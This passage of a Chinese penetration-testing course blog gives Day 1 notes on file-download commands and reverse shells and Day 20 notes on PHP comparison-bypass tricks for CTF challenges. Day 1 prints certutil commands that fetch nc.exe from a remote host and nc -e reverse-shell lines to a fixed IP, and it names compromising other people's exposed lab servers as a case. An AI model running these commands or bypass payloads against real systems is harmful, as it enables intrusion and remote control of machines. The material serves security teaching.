    <content type="html"><![CDATA[<h2 id="第1天：基础入门-操作系统-amp-名词-amp-文件下载-amp-反弹SHELL-amp-防火墙绕过"><a href="#第1天：基础入门-操作系统-amp-名词-amp-文件下载-amp-反弹SHELL-amp-防火墙绕过" class="headerlink" title="第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h2><p>​                 <img src="/2022/01/11/day01/image-20220114212245566.png" class="" title="image-20220114212245566">        </p><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>知识点：<br>1、名词解释-渗透测试-漏洞<span class="hljs-built_in">&amp;</span>攻击<span class="hljs-built_in">&amp;</span>后门<span class="hljs-built_in">&amp;</span>代码<span class="hljs-built_in">&amp;</span>专业词<br>2、必备技能-操作系统-用途<span class="hljs-built_in">&amp;</span>命令<span class="hljs-built_in">&amp;</span>权限<span class="hljs-built_in">&amp;</span>用户<span class="hljs-built_in">&amp;</span>防火墙<br>3、必备技能-文件下载-缘由<span class="hljs-built_in">&amp;</span>场景<span class="hljs-built_in">&amp;</span>使用-提权<span class="hljs-built_in">&amp;</span>后渗透<br>4、必备技能-反弹命令-缘由<span class="hljs-built_in">&amp;</span>场景<span class="hljs-built_in">&amp;</span>使用-提权<span class="hljs-built_in">&amp;</span>后渗透<br><br>前后端，POC/EXP，Payload/Shellcode，后门/Webshell，木马/病毒，<br>反弹，回显，跳板，黑白盒测试，暴力破解，社会工程学，撞库，ATT<span class="hljs-built_in">&amp;</span>CK等<br>参考：<br>https://www.cnblogs.com/sunny11/p/13583083.html<br>https://forum.ywhack.com/bountytips.php?download<br>https://forum.ywhack.com/reverse-shell/<br>https://blog.csdn.net/weixin<span class="hljs-built_in">_</span>43303273/article/details/83029138<br></code></pre></td></tr></table></figure><hr><p>演示案例：</p><ul><li>基础案例1：操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</li><li>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</li><li>实用案例2：反弹Shell命令-解决数据回显&amp;解决数据通讯</li><li>结合案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</li><li>结合案例2：学会了有手就行-Fofa拿下同行Pikachu服务器</li></ul><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>基础案例1：操作系统-用途<span class="hljs-built_in">&amp;</span>命令<span class="hljs-built_in">&amp;</span>权限<span class="hljs-built_in">&amp;</span>用户<span class="hljs-built_in">&amp;</span>防火墙<br>1、个人计算机<span class="hljs-built_in">&amp;</span>服务器用机<br>2、Windows<span class="hljs-built_in">&amp;</span>Linux常见命令<br>3、文件权限<span class="hljs-built_in">&amp;</span>服务权限<span class="hljs-built_in">&amp;</span>用户权限等<br>4、系统用户<span class="hljs-built_in">&amp;</span>用户组<span class="hljs-built_in">&amp;</span>服务用户等分类<br>5、自带防火墙出站<span class="hljs-built_in">&amp;</span>入站规则策略协议<br><br><span class="hljs-params">#</span>实用案例1：文件上传下载-解决无图形化<span class="hljs-built_in">&amp;</span>解决数据传输<br>Linux：wget curl python ruby perl java等<br>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等<br><br><span class="hljs-params">#</span>实用案例2：反弹Shell命令-解决数据回显<span class="hljs-built_in">&amp;</span>解决数据通讯<br>useradd 用户名 passwd 用户名<br>测试Linux系统添加用户或修改密码命令交互回显问题<br><br><span class="hljs-params">#</span>结合案例1：防火墙绕过-正向连接<span class="hljs-built_in">&amp;</span>反向连接<span class="hljs-built_in">&amp;</span>内网服务器<br>1、内网：<br>内网 -&gt; xiaodi8<br>xiaodi8 !-&gt; 内网<br>2、防火墙：<br>xiaodi8 &lt;-&gt; aliyun<br>xiaodi8防火墙 -&gt; aliyun<br>aliyun !-&gt; xiaodi8防火墙<br><br><span class="hljs-params">#</span>结合案例2：学会了有手就行-Fofa拿下同行Pikachu服务器<br>文件下载<span class="hljs-built_in">&amp;</span>反弹Shell:<br>certutil -urlcache -split -f http://www.xiaodi8.com/nc.exe nc.exe<br>nc -e cmd 47.75.212.155 5566<br></code></pre></td></tr></table></figure><hr><p>涉及资源：</p><p><a href="https://docs.qq.com/doc/DQ3Z6RkNpaUtMcEFr">补充：涉及录像课件资源软件包资料等下载地址</a></p><hr><h3 id="0x01-渗透测试专用术语"><a href="#0x01-渗透测试专用术语" class="headerlink" title="0x01 渗透测试专用术语"></a>0x01 渗透测试专用术语</h3><p>参考链接：<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p><h3 id="0x02-棱角下载命令生成"><a href="#0x02-棱角下载命令生成" class="headerlink" title="0x02 棱角下载命令生成"></a>0x02 棱角下载命令生成</h3><p>参考链接 ：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p>这里get到了一个新的网站 (技术交流)</p><p>棱角安全团队技术论坛：<a href="https://forum.ywhack.com/">https://forum.ywhack.com/</a></p><h3 id="0x03-渗透测试中常用的命令"><a href="#0x03-渗透测试中常用的命令" class="headerlink" title="0x03 渗透测试中常用的命令"></a>0x03 渗透测试中常用的命令</h3><p>参考链接：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p><p>这里get到了一个新的网站( GBHackers安全社区)</p><p><a href="https://gbhackers.com/category/pentesting/">PENTESTING Archives - GBHackers On Security</a></p><p><strong>1.linux命令</strong></p><p>渗透测试中常用的linux命令<br>上面博客提到的基本都能满足需求<br><strong>2.cmd命令</strong></p><p><a href="https://www.cnblogs.com/air-of-code/p/6015590.html">常用的cmd命令</a></p><p>cmd命令和linux命令常用的对于web入门的萌新可以看看上面博客，多敲一敲用的时候查就行了<br><strong>3.powershell</strong></p><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。<br>它引入了许多非常有用的新概念，从而进一步扩展了您在 Windows 命令提示符和 Windows Script Host 环境中获得的知识和创建的脚本。<br>对于powershell，需要去学习，这里有三篇比较实用于渗透测试的文章，是我的好友香山<a href="https://rootclay.github.io/">ROOTCLAY博客</a>师傅在安全客发表的三篇文章，详细全面<br><a href="https://www.anquanke.com/post/id/87976">Powershell攻击指南黑客后渗透之道系列——基础篇</a><br><a href="https://www.anquanke.com/post/id/88851">Powershell攻击指南黑客后渗透之道系列——进阶利用</a><br><a href="https://www.anquanke.com/post/id/89362">Powershell攻击指南黑客后渗透之道系列——实战篇</a></p><p>命令需要大家自己多去用一用就会熟悉</p><h4 id="0x04-反弹shell的使用"><a href="#0x04-反弹shell的使用" class="headerlink" title="0x04 反弹shell的使用"></a>0x04 反弹shell的使用</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs tex">什么是反弹shell？<br><br>　　反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。<br><br>为什么要反弹shell？<br><br>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。<br><br>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？<br><br>有如下情况：<br><br>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 <br><br>2.目标机器的ip动态改变，你不能持续控制。<br><br>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br><br>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。<br><br>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。<br><br>参考于https://zhuanlan.zhihu.com/p/138393396<br></code></pre></td></tr></table></figure><p>在控制机上开启监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lvvp 5566<br></code></pre></td></tr></table></figure><p>(1)在被控机上(windows)开启正向连接(nc)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -e cmd 控制机ip 控制机端口<br></code></pre></td></tr></table></figure><p>(2)在被控机上(linux)开启正向连接(nc)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -e /bin/sh 控制机ip 控制机端口<br></code></pre></td></tr></table></figure><p>这里需要注意，很多软件命令可以造成反弹shell，详见参考 <a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>]]></content>
    
    
    <categories>
      
      <category>小迪安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php安全特性学习</title>
    <link href="/2022/01/11/day20/"/>
    <url>/2022/01/11/day20/</url>
    
    <content type="html"><![CDATA[<h2 id="第20天：WEB攻防-PHP特性-amp-缺陷对比函数-amp-CTF考点-amp-CMS审计实例"><a href="#第20天：WEB攻防-PHP特性-amp-缺陷对比函数-amp-CTF考点-amp-CMS审计实例" class="headerlink" title="第20天：WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例"></a>第20天：WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例</h2><p>​                 <img src="/2022/01/11/day20/PHP.png" class="" title="img">        </p><figure class="highlight tex"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>知识点：<br>1、过滤函数缺陷绕过<br>2、CTF考点与代码审计<br><br><span class="hljs-params">#</span>详细点：<br>==与===<br>md5<br>intval<br>strpos<br>in<span class="hljs-built_in">_</span>array<br>preg<span class="hljs-built_in">_</span>match<br>str<span class="hljs-built_in">_</span>replace<br><br>&lt;?php<br>header(&quot;Content-Type:text/html;charset=utf-8&quot;);<br><span class="hljs-built_in">$</span>flag=&#x27;xiaodi ai chi xigua!&#x27;;<br><br>1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型<br>&lt;?php<br><span class="hljs-built_in">$</span>a=1;<br>if(<span class="hljs-built_in">$</span>a==<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;x&#x27;])&#123;<br>    echo <span class="hljs-built_in">$</span>flag;<br>    &#125;<br>?&gt;<br>//1.0 +1 1a<br>&lt;?php<br><span class="hljs-built_in">$</span>a=&#x27;1&#x27;;<br>if(<span class="hljs-built_in">$</span>a===<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;y&#x27;])&#123;<br>    echo <span class="hljs-built_in">$</span>flag;<br>&#125;<br>?&gt;<br><br>//1.0 +1等<br><br><br>2、MD5函数缺陷绕过 ==弱对比 ===强类型对比<br>&lt;?php<br>if(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;name&#x27;] != <span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;password&#x27;])&#123;<br>    if(MD5(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;name&#x27;]) == MD5(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;password&#x27;]))&#123;<br>        echo <span class="hljs-built_in">$</span>flag;<br>    &#125;<br>    echo &#x27;?&#x27;;<br>&#125;<br>?&gt;<br>//==<br>//echo MD5(&#x27;QNKCDZO&#x27;);<br>//echo MD5(&#x27;240610708&#x27;);<br><br>//===<br>//name[]=1<span class="hljs-built_in">&amp;</span>password[]=2<br><br>3、intval缺陷绕过<br>&lt;?php<br><span class="hljs-built_in">$</span>i=&#x27;666&#x27;;<br><span class="hljs-built_in">$</span>ii=<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;n&#x27;];<br>if(intval(<span class="hljs-built_in">$</span>ii==<span class="hljs-built_in">$</span>i))&#123;<br>    echo <span class="hljs-built_in">$</span>flag;<br>&#125;<br>?&gt;<br><br>// 666.0 +666<br><br><span class="hljs-built_in">$</span>i=&#x27;666&#x27;;<br><span class="hljs-built_in">$</span>ii=<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;n&#x27;];<br>if(intval(<span class="hljs-built_in">$</span>ii==<span class="hljs-built_in">$</span>i,0))&#123;<br>    echo <span class="hljs-built_in">$</span>flag;<br>&#125;<br><br>//0x29a<br><br>//4、对于strpos()函数，我们可以利用换行进行绕过（<span class="hljs-comment">%0a）</span><br><span class="hljs-built_in">$</span>i=&#x27;666&#x27;;<br><span class="hljs-built_in">$</span>ii=<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;h&#x27;];<br>if(strpos(<span class="hljs-built_in">$</span>ii==<span class="hljs-built_in">$</span>i,&quot;0&quot;))&#123;<br>    echo <span class="hljs-built_in">$</span>flag;<br>&#125;<br><br><br>//?num=<span class="hljs-comment">%0a666</span><br><br><br><br>//5、in<span class="hljs-built_in">_</span>array第三个参数安全<br><span class="hljs-built_in">$</span>whitelist = [1,2,3];<br><span class="hljs-built_in">$</span>page=<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;i&#x27;];<br>if (in<span class="hljs-built_in">_</span>array(<span class="hljs-built_in">$</span>page, <span class="hljs-built_in">$</span>whitelist)) &#123;<br>    echo &quot;yes&quot;;<br>&#125;<br><br>//?i=1ex<br><br>//6、preg<span class="hljs-built_in">_</span>match只能处理字符串，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错<br>if(isset(<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;num&#x27;]))&#123;<br>    <span class="hljs-built_in">$</span>num = <span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;num&#x27;];<br>    if(preg<span class="hljs-built_in">_</span>match(&quot;/[0-9]/&quot;, <span class="hljs-built_in">$</span>num))&#123;<br>        die(&quot;no no no!&quot;);<br>    &#125;<br>    if(intval(<span class="hljs-built_in">$</span>num))&#123;<br>        echo <span class="hljs-built_in">$</span>flag;<br>    &#125;<br>&#125;<br><br><br>//?num[]=1<br><br>//7、str<span class="hljs-built_in">_</span>replace无法迭代过滤<br><span class="hljs-built_in">$</span>sql=<span class="hljs-built_in">$</span><span class="hljs-built_in">_</span>GET[&#x27;s&#x27;];<br><span class="hljs-built_in">$</span>sql=str<span class="hljs-built_in">_</span>replace(&#x27;select&#x27;,&#x27;&#x27;,<span class="hljs-built_in">$</span>sql);<br>echo <span class="hljs-built_in">$</span>sql;<br><br>//?s=sselectelect<br></code></pre></td></tr></table></figure><p>演示案例：</p><ul><li>原理-缺陷函数-使用讲解-本地</li><li>实践-CTFShow-PHP特性-89关卡</li><li>实践-代码审计-过滤缺陷-文件读取</li></ul><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天的课程主要是通过ctf来讲php函数的一些缺陷，比如弱类型与强类型的比较，一些函数引发的安全问题，以及如何绕过等等，很有深意。</p><h3 id="0x01-与-的区别"><a href="#0x01-与-的区别" class="headerlink" title="0x01 ==与===的区别"></a>0x01 ==与===的区别</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">1、在PHP中===表示全等运算符，而==表示等于运算符；<br>2、如果等于运算符两边的值相等，则返回true，而如果全等运算符两边的值相等但类型不等，则返回false。<br></code></pre></td></tr></table></figure><img src="/2022/01/11/day20/image-20220110230038025.png" class="" title="image-20220110230038025"><p>也就是说’==’仅比较两个变量的值，’===’不仅比较值，还会比较类型。</p><p>==弱对比 ===强类型对比</p><h3 id="0x02-MD5、SHA1函数缺陷-Hash比较缺陷-绕过"><a href="#0x02-MD5、SHA1函数缺陷-Hash比较缺陷-绕过" class="headerlink" title="0x02 MD5、SHA1函数缺陷(Hash比较缺陷)绕过"></a>0x02 MD5、SHA1函数缺陷(Hash比较缺陷)绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) == MD5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;?&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//如果是&quot;==&quot;,可以构造出MD5值为0e开头的字符串，这样的话弱类型比较时就会认为是科学技术法，因此可以绕过。</span><br><span class="hljs-comment">//echo MD5(&#x27;QNKCDZO&#x27;);</span><br><span class="hljs-comment">//echo MD5(&#x27;240610708&#x27;);</span><br><br><span class="hljs-comment">//如果是&quot;===&quot;,PHP自身的特性使得可以提交一个数组，而md5函数传入数组的返回值都是NULL，这样就可以绕过强类型比较，这样可以进行数组绕过。</span><br><span class="hljs-comment">//name[]=1&amp;password[]=2</span><br></code></pre></td></tr></table></figure><h4 id="md5加密后0e开头的字符串"><a href="#md5加密后0e开头的字符串" class="headerlink" title="md5加密后0e开头的字符串"></a>md5加密后0e开头的字符串</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs tex">QNKCDZO<br>0e830400451993494058024219903391<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a<br>0e509367213418206700842008763514<br>s1502113478a<br>0e861580163291561247404381396064<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s155964671a<br>0e342768416822451524974117254469<br>s1184209335a<br>0e072485820392773389523109082030<br>s1665632922a<br>0e731198061491163073197128363787<br>s1502113478a<br>0e861580163291561247404381396064<br>s1836677006a<br>0e481036490867661113260034900752<br>s1091221200a<br>0e940624217856561557816327384675<br>s155964671a<br>0e342768416822451524974117254469<br>s1502113478a<br>0e861580163291561247404381396064<br>s155964671a<br>0e342768416822451524974117254469<br>s1665632922a<br>0e731198061491163073197128363787<br>s155964671a<br>0e342768416822451524974117254469<br>s1091221200a<br>0e940624217856561557816327384675<br>s1836677006a<br>0e481036490867661113260034900752<br>s1885207154a<br>0e509367213418206700842008763514<br>s532378020a<br>0e220463095855511507588041205815<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s214587387a<br>0e848240448830537924465865611904<br>s1502113478a<br>0e861580163291561247404381396064<br>s1091221200a<br>0e940624217856561557816327384675<br>s1665632922a<br>0e731198061491163073197128363787<br>s1885207154a<br>0e509367213418206700842008763514<br>s1836677006a<br>0e481036490867661113260034900752<br>s1665632922a<br>0e731198061491163073197128363787<br>s878926199a<br>0e545993274517709034328855841020<br></code></pre></td></tr></table></figure><h4 id="sha1加密的"><a href="#sha1加密的" class="headerlink" title="sha1加密的"></a>sha1加密的</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">sha1(&#x27;aaroZmOk&#x27;)<br>sha1(&#x27;aaK1STfy&#x27;)<br>sha1(&#x27;aaO8zKZF&#x27;)<br>sha1(&#x27;aa3OFF9m&#x27;)<br></code></pre></td></tr></table></figure><h4 id="还有MD5和双MD5以后的值都是0e开头的字符串"><a href="#还有MD5和双MD5以后的值都是0e开头的字符串" class="headerlink" title="还有MD5和双MD5以后的值都是0e开头的字符串"></a>还有MD5和双MD5以后的值都是0e开头的字符串</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure><h4 id="加解密都是0e开头的字符串"><a href="#加解密都是0e开头的字符串" class="headerlink" title="加解密都是0e开头的字符串"></a>加解密都是0e开头的字符串</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">0e215962017<br></code></pre></td></tr></table></figure><h3 id="0x03-intval缺陷绕过"><a href="#0x03-intval缺陷绕过" class="headerlink" title="0x03 intval缺陷绕过"></a>0x03 intval缺陷绕过</h3><p>intval — 获取变量的整数值</p><p>value:要转换成 integer 的数量值 </p><p>base:转化所使用的进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">intval(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$value</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span>): <span class="hljs-keyword">int</span><br></code></pre></td></tr></table></figure><p>通过使用指定的进制 <code>base</code> 转换（默认是十进制），返回变量 <code>value</code>   的 int 数值。   <strong>intval()</strong> 不能用于 object，否则会产生   <strong><code>E_NOTICE</code></strong> 错误并返回 1。</p><p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞.此外有些题目还利用intval函数四舍五入的特性来绕过判断！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tex">数组绕过<br><br>四舍五入(小数)绕过<br>intval函数遇到小数点时会进行四舍五入，可以绕过一些限制。<br><br>字母绕过<br>intval()函数如果<span class="hljs-built_in">$</span>base为0则<span class="hljs-built_in">$</span>var中存在字母的话遇到字母就停止读取，但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造4476e123 其实不需要是e其他的字母也可以。<br><br>异或绕过<br><br>取反绕过<br><br>二进制绕过<br></code></pre></td></tr></table></figure><h3 id="0x04-strpos-函数绕过"><a href="#0x04-strpos-函数绕过" class="headerlink" title="0x04 strpos()函数绕过"></a>0x04 strpos()函数绕过</h3><p>strpos — 查找字符串首次出现的位置</p><p><strong>haystack:在该字符串中进行查找。</strong></p><p><strong>返回值</strong></p><p>返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。如果没找到 needle，将返回 false。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">strpos(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>): <span 